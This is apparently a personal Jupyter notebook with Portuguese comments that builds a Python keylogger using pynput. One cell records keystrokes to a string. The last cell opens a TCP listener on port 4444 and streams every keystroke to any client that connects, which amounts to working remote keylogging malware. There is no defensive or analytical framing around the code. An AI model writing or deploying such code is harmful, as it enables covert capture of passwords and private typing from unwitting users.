{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "from socket import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "list_pressed_keys = []\n",
    "pressed_keys_str = \"\"\n",
    "\n",
    "\n",
    "def on_press(key):\n",
    "    global pressed_keys_str\n",
    "    try:\n",
    "        # Adiciona a representação de caractere da tecla à string\n",
    "        pressed_keys_str += key.char\n",
    "    except AttributeError:\n",
    "        # Para teclas especiais, como espaço, você pode escolher uma representação\n",
    "        if key == Key.space:\n",
    "            pressed_keys_str += ' '\n",
    "    \n",
    "    list_pressed_keys.append(pressed_keys_str)\n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False  # Termina o listener quando a tecla 'esc' é pressionada\n",
    "\n",
    "\n",
    "# Configura e inicia o listener\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# Exibe a string resultante\n",
    "print(f\"Teclas pressionadas: {pressed_keys_str}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "teste\n"
     ]
    }
   ],
   "source": [
    "print(pressed_keys_str)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = socket(AF_INET, SOCK_STREAM)\n",
    "s.bind(('0.0.0.0', 4444))\n",
    "s.listen(2)\n",
    "\n",
    "while True:\n",
    "    obj, addr = s.accept()\n",
    "\n",
    "    def on_press(key):\n",
    "        key = str(key)\n",
    "\n",
    "        if key == \"Key.enter\":\n",
    "            obj.send(b\"\\n\")\n",
    "\n",
    "        elif key == \"Key.space\":\n",
    "            obj.send(b\" \")\n",
    "\n",
    "        else:\n",
    "            obj.send(bytes(key.replace(\"'\", \"\"), \"utf-8\"))\n",
    "\n",
    "    try:\n",
    "        with Listener(on_press) as lis:\n",
    "            lis.join()\n",
    "\n",
    "    except:\n",
    "        obj.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
